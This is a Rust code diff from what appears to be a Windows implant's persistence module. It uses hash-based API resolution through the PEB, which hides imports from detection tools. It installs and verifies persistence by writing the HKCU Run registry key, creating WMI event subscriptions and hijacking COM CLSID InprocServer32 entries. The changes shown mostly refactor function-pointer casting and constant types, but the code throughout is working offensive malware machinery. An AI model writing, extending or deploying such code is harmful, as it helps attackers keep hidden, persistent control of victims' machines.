@@ -111,7 +111,14 @@ fn shell_quote_single(s: &str) -> String {
 pub use windows::*;
 #[cfg(windows)]
 pub mod windows {
-    use super::Persist;
+    use super::{
+        Persist,
+        PersistenceConfig,
+        resolve_registry_value_name,
+        resolve_wmi_subscription_name,
+        resolve_com_hijack_clsid,
+        resolve_startup_filename,
+    };
     use anyhow::{anyhow, Result};
     use std::path::PathBuf;
     use std::ptr;
@@ -124,12 +131,28 @@ pub mod windows {
 
     use crate::win_types::{GUID, DWORD, HMODULE, HRESULT, HANDLE, LONG};
 
+    /// Cast a raw function address to a typed function pointer.
+    #[inline(always)]
+    unsafe fn cast_fn<T>(addr: usize) -> Option<T> {
+        if std::mem::size_of::<T>() != std::mem::size_of::<usize>() {
+            return None;
+        }
+
+        let mut out = std::mem::MaybeUninit::<T>::uninit();
+        std::ptr::copy_nonoverlapping(
+            (&addr as *const usize).cast::<u8>(),
+            out.as_mut_ptr().cast::<u8>(),
+            std::mem::size_of::<usize>(),
+        );
+        Some(out.assume_init())
+    }
+
     /// Resolve a function pointer from a DLL that is already loaded (in PEB).
     #[inline(always)]
     unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
         let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
         let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-        Some(std::mem::transmute::<_, T>(fn_addr))
+        cast_fn(fn_addr)
     }
 
     /// Resolve a function from a DLL that may not be in the PEB yet.
@@ -143,7 +166,7 @@ pub mod windows {
     ) -> Option<T> {
         if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
             if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
-                return Some(std::mem::transmute::<_, T>(addr));
+                return cast_fn(addr);
             }
         }
         // DLL not loaded — use LoadLibraryW from kernel32.
@@ -153,12 +176,12 @@ pub mod windows {
                 base,
                 pe_resolve::hash_str(b"LoadLibraryW\0"),
             )?;
-            std::mem::transmute::<_, FnLoadLibraryW>(addr)
+            cast_fn(addr)?
         };
         let _hmod = load_library_w(dll_wide.as_ptr());
         let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
         let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-        Some(std::mem::transmute::<_, T>(fn_addr))
+        cast_fn(fn_addr)
     }
 
     // ── DLL hash constants (not in pe_resolve build.rs) ──────────────────
@@ -319,7 +342,7 @@ pub mod windows {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             const KEY_WRITE: u32 = 0x00020006;
             const REG_SZ: u32 = 1;
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -371,7 +394,7 @@ pub mod windows {
 
         fn remove(&self) -> Result<()> {
             const KEY_WRITE: u32 = 0x00020006;
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -407,7 +430,7 @@ pub mod windows {
 
         fn verify(&self) -> Result<bool> {
             const KEY_READ: u32 = 0x00020019;
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                 .encode_utf16()
@@ -454,7 +477,7 @@ pub mod windows {
     // We define only the vtable slots we need.  Layout must match the real
     // COM vtables on every version of Windows; these match the MSDN/SDK
     // definitions exactly.
-    use crate::win_types::{GUID, REFIID, BSTR, IUnknown, IUnknownVtbl, LONG, HRESULT, VARIANT};
+    use crate::win_types::{REFIID, BSTR, IUnknown, IUnknownVtbl, VARIANT};
 
     // IWbemClassObject (partial vtable – only Put and Release are used)
     #[repr(C)]
@@ -643,7 +666,7 @@ pub mod windows {
         /// Create a new zeroed ComVariant.
         fn new() -> Self {
             Self {
-                var: VARIANT { _data: [0; 3] },
+                var: VARIANT::default(),
                 cleared: false,
             }
         }
@@ -1011,7 +1034,7 @@ pub mod windows {
 
         // Step 3: Set proxy blanket on IWbemServices
         let hr = co_set_blanket(
-            services_ptr as *mut IUnknown,
+            services_ptr as *mut std::ffi::c_void,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
             ptr::null_mut(),
@@ -1207,7 +1230,7 @@ pub mod windows {
         }
 
         let hr = co_set_blanket(
-            services_ptr as *mut IUnknown,
+            services_ptr as *mut std::ffi::c_void,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
             ptr::null_mut(),
@@ -1343,7 +1366,7 @@ pub mod windows {
     // Queries root\subscription for an __EventFilter with the given name.
     // Returns Ok(true) if found, Ok(false) if not.
     unsafe fn wmi_verify_com(subscription_name: &str) -> Result<bool> {
-        use crate::win_types::S_OK;
+        use crate::win_types::{succeeded, S_OK};
 
         let (locator, services) = wmi_connect()?;
 
@@ -1580,7 +1603,7 @@ pub mod windows {
             }
             const KEY_WRITE: u32 = 0x00020006;
             const REG_SZ: u32 = 1;
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> =
                 format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
@@ -1648,7 +1671,7 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid)
                 .encode_utf16()
@@ -1665,7 +1688,7 @@ pub mod windows {
 
         fn verify(&self) -> Result<bool> {
             const KEY_READ: u32 = 0x00020019;
-            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001i32 as *mut std::ffi::c_void;
+            const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u32 as *mut std::ffi::c_void;
 
             let subkey: Vec<u16> =
                 format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
